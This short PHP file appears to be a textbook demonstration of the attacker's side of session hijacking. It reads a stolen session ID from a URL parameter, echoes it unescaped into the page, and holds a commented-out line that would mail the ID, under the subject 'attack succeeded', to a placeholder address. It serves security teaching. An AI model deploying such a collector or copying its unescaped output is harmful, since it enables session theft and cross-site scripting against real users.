<?php
  mb_language('Japanese');
  $sid = $_GET['sid'];
  //mb_send_mail('wasbook@example.jp', '攻撃成功', 'セッションID:' . $sid,'From: offender@example.com');
?>
<body>
<h1>以下の情報を秘密裏にメールしました。</h1>
<p><?php echo $sid; ?></p>
</body>
